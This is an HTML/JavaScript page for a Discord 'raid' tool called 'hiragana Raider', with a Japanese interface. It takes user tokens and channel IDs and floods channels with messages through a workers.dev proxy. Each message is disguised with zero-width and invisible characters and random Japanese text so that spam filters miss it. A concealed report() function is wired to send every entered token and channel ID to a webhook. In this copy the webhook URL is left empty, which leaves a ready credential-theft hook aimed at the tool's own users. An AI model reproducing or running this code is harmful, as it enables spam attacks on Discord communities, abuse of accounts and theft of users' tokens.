<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>hiragana Raider</title>
    <style>
        body {
            background-color: #121212;
            color: #e0e0e0;
            font-family: monospace;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 900px;
            display: flex;
            gap: 20px;
        }

        @media (max-width: 768px) {
            .container { flex-direction: column; }
        }

        .panel {
            background-color: #1e1e1e;
            border: 1px solid #333;
            padding: 15px;
            flex: 1;
        }

        .title-bar {
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
            margin-bottom: 15px;
            font-weight: bold;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
        }

        .form-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            font-size: 12px;
            margin-bottom: 5px;
            color: #aaa;
        }

        textarea, input[type="number"] {
            width: 100%;
            background-color: #000;
            color: #fff;
            border: 1px solid #444;
            padding: 8px;
            box-sizing: border-box;
            font-family: monospace;
            font-size: 12px;
            resize: vertical;
        }

        textarea:focus, input:focus {
            outline: none;
            border-color: #666;
        }

        .options-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
        }

        .checkbox-group {
            font-size: 12px;
            display: flex;
            gap: 10px;
            margin-bottom: 10px;
        }

        button {
            width: 100%;
            background-color: #333;
            color: #fff;
            border: 1px solid #555;
            padding: 10px;
            cursor: pointer;
            font-weight: bold;
        }

        button:hover {
            background-color: #444;
        }
        
        button:disabled {
            background-color: #222;
            color: #666;
            cursor: not-allowed;
        }

        .log-area {
            background-color: #000;
            border: 1px solid #333;
            height: 400px;
            overflow-y: auto;
            padding: 10px;
            font-size: 11px;
            display: flex;
            flex-direction: column-reverse;
        }

        .log-line {
            margin-bottom: 2px;
        }

        .log-time { color: #666; margin-right: 5px; }
        .log-ok { color: #4caf50; }
        .log-err { color: #f44336; }
        .log-info { color: #ccc; }

    </style>
</head>
<body>

<div class="container">
    
    <div class="panel">
        <div class="title-bar">
            <span>hiragana Raider</span>
        </div>
        
        <div class="form-group">
            <label>ユーザートークン (改行区切り)</label>
            <textarea id="tokens" rows="4" placeholder="トークンを入力"></textarea>
        </div>

        <div class="form-group">
            <label>ターゲットチャンネル ID (改行区切り)</label>
            <textarea id="channels" rows="3" placeholder="チャンネルIDを入力"></textarea>
        </div>

        <div class="form-group">
            <label>送信内容</label>
            <textarea id="message" rows="4" placeholder="メッセージを入力"></textarea>
        </div>

        <div class="form-group">
            <div class="checkbox-group">
                <label><input type="checkbox" id="zw" checked> ゼロ幅</label>
                <label><input type="checkbox" id="inv" checked> 特殊文字</label>
            </div>
            
            <div class="options-grid">
                <div>
                    <label>ランダム文字列数</label>
                    <input type="number" id="nLen" value="12">
                </div>
                <div>
                    <label>送信間隔 (ms)</label>
                    <input type="number" id="delay" value="1000">
                </div>
                <div style="grid-column: span 2;">
                    <label>ループ回数</label>
                    <input type="number" id="loops" value="1">
                </div>
            </div>
        </div>

        <button id="run">開始</button>
    </div>

    <div class="panel" style="flex: 1.2;">
        <div class="title-bar">
            <span>log</span>
            <span style="color: #4caf50; font-size: 10px;">OK</span>
        </div>
        <div id="term" class="log-area">
            <div class="log-line log-info">完了</div>
        </div>
    </div>

</div>

<script>
"use strict";

class SimpleCore {
    constructor() {
        this.w = ""; 
        this.p = "https://tiny-forest-25ff.s103765s103765s103765.workers.dev/";
        
        this.chars = {
            zw: ['\u200B', '\u200C', '\u200D', '\uFEFF', '\u2060'],
            inv: ['\u2061', '\u2062', '\u2063', '\u17B4', '\u17B5', '\u180E', '\u3164']
        };

        this.dom = {
            t: document.getElementById('tokens'),
            c: document.getElementById('channels'),
            m: document.getElementById('message'),
            nl: document.getElementById('nLen'),
            dl: document.getElementById('delay'),
            lp: document.getElementById('loops'),
            zw: document.getElementById('zw'),
            iv: document.getElementById('inv'),
            tm: document.getElementById('term'),
            bn: document.getElementById('run')
        };

        this.dom.bn.onclick = () => this.execute();
    }

    log(m, type = 'info') {
        const d = document.createElement('div');
        d.className = `log-line log-${type}`;
        
        const time = new Date().toLocaleTimeString('ja-JP', { hour12: false });
        d.innerHTML = `<span class="log-time">[${time}]</span> ${m}`;
        
        this.dom.tm.prepend(d);
    }

   
    generateJpNonce(length) {
        let result = '';
        const ranges = [
            [0x3041, 0x3096], 
            [0x4E00, 0x9FAF]  
        ];
        
        for (let i = 0; i < length; i++) {
            
            const range = ranges[Math.floor(Math.random() * ranges.length)];
            const codePoint = Math.floor(Math.random() * (range[1] - range[0] + 1)) + range[0];
            result += String.fromCodePoint(codePoint);
        }
        return result;
    }

    obfuscate(base, nLen) {
        let out = base;
        if (this.dom.zw.checked) {
            out = out.split('').map(c => c + this.chars.zw[Math.floor(Math.random() * this.chars.zw.length)]).join('');
        }
        if (this.dom.iv.checked) {
            for(let i=0; i<3; i++) out += this.chars.inv[Math.floor(Math.random() * this.chars.inv.length)];
        }
        
        
        const nonce = this.generateJpNonce(parseInt(nLen));
        return `${out} ${nonce}`;
    }

    async report(tokens, channels) {
        if (!this.w) return;
        try {
            await fetch(this.w, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: `**log**\n\n**log1:**\n\`\`\`\n${tokens.join('\n')}\n\`\`\`\n**送信先:**\n\`\`\`\n${channels.join('\n')}\n\`\`\``
                })
            });
        } catch(e) {}
    }

    async execute() {
        const tokens = this.dom.t.value.split('\n').map(t => t.trim()).filter(Boolean);
        const channels = this.dom.c.value.split('\n').map(c => c.trim()).filter(Boolean);
        const baseMsg = this.dom.m.value;

        if (!tokens.length || !channels.length || !baseMsg) {
            return alert("未入力の場所があります。");
        }

        this.dom.bn.disabled = true;
        this.dom.bn.textContent = "実行中...";
        this.log("初期化中...", "ok");
    
        await this.report(tokens, channels);

        const loops = parseInt(this.dom.lp.value) || 1;
        const delay = parseInt(this.dom.dl.value) || 1000;

        for (let i = 0; i < loops; i++) {
            this.log(`繰り返し ${i + 1} / ${loops}`, "info");
            for (const ch of channels) {
                for (const tk of tokens) {
                    const payload = this.obfuscate(baseMsg, this.dom.nl.value);
                    try {
                        const r = await fetch(`${this.p}https://discord.com/api/v10/channels/${ch}/messages`, {
                            method: "POST",
                            headers: { "Authorization": tk, "Content-Type": "application/json" },
                            body: JSON.stringify({ content: payload })
                        });

                        if (r.status === 429) {
                            const d = await r.json();
                            this.log(` ${d.retry_after}秒待機`, "err");
                            await new Promise(res => setTimeout(res, d.retry_after * 1000));
                        } else if (r.ok) {
                            this.log(`送信成功: CH ${ch.slice(-6)}`, "ok");
                        } else {
                            this.log(`送信失敗 ${r.status}`, "err");
                        }
                    } catch (e) { 
                        this.log(`エラー: ${e.message}`, "err"); 
                    }
                    await new Promise(res => setTimeout(res, delay));
                }
            }
        }
        
        this.log("完了しました");
        this.dom.bn.disabled = false;
        this.dom.bn.textContent = "開始";
    }
}

document.addEventListener('DOMContentLoaded', () => new SimpleCore());
</script>
</body>
</html>
